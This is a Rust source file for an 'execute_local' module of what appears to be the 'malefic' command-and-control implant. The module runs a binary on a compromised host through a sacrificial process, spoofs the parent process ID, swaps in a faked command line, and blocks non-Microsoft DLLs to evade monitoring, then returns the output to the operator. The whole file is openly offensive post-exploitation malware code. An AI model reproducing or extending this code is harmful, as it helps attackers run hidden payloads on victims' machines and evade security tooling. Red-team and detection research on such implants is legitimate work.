use std::ptr::null_mut;

use malefic_helper::common::utils::format_cmdline;
use malefic_proto::proto::modulepb::BinaryResponse;
use malefic_helper::win::kit::pe::run_sacrifice;
use malefic_helper::common::filesys::get_binary;
use crate::prelude::*;

pub struct ExecuteLocal {}

#[async_trait]
#[module_impl("execute_local")]
impl Module for ExecuteLocal {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for ExecuteLocal {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> malefic_proto::module::ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;

        let mut exec_response = BinaryResponse::default();
        let mut result: Vec<u8> = Vec::new();

        let (bin_content, bin_name) = to_error!(get_binary(&request.path))?;
        if let Some(sacrifice) = request.sacrifice {
            let cmdline = format_cmdline(request.process_name, request.args);
            let (real_commandline, hijack_commandline) = if sacrifice.argue.is_empty() {
                (cmdline, String::new())
            } else {
                (sacrifice.argue, cmdline)
            };
            unsafe {
                result = run_sacrifice(
                    null_mut(),
                    real_commandline.as_bytes(),
                    hijack_commandline.as_bytes(),
                    sacrifice.ppid,
                    request.output,
                    sacrifice.block_dll);
            }
        }
        exec_response.data = result;
        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(exec_response)))
    }
}